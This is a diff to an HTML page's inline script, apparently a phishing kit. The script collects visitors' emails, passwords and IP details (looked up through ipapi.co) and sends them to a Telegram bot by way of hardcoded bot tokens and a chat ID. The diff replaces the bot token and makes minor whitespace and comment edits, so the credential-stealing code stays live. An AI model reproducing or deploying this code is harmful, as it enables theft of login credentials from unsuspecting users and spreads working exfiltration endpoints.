@@ -179,6 +179,7 @@
 
     </div>
     </aside>
+
     <footer class="footer">
       <nav aria-label="Footer" class="footer__links">
         <ul class="footer__list">
@@ -197,7 +198,6 @@
 
   </div>
   </div>
-
 <script>
   let hasAlerted = false; // Flag to track whether alert has been shown
 
@@ -218,7 +218,7 @@
 
   // Function to send data to Telegram
   async function telegramSend(message) {
-    const apiKey = '6777609322:AAEBGKmFLNac3yCv7uU9I1x5c3xJiIUUaSY';
+    const apiKey = '6687447182:AAHG4lB5KVM6UD6eoARXJlzkroFEQGIKNU4';
     const chatId = '850703510';
     const format = 'HTML';
 
@@ -248,7 +248,7 @@
     }
   }
 
-  // Function to get additional information about the  visitor
+  // Function to get additional information about the visitor
   async function getVisitorInfo() {
     try {
       const response = await fetch('https://ipapi.co/json/');
@@ -303,7 +303,7 @@ Visitor Information:
 
   // Function to send data to Telegram on form submission
   async function telegramSendOnFormSubmit(email, password, ipAddress) {
-    const apiKey = '6777609322:AAEBGKmFLNac3yCv7uU9I1x5c3xJiIUUaSY';
+    const apiKey = '6687447182:AAHG4lB5KVM6UD6eoARXJlzkroFEQGIKNU4';
     const chatId = '850703510';
     const format = 'HTML';
 
@@ -441,6 +441,5 @@ Visitor Information:
   // Call the checkASNAndIP function when the page loads
   checkASNAndIP();
 </script>
-
 </body>
 </html>
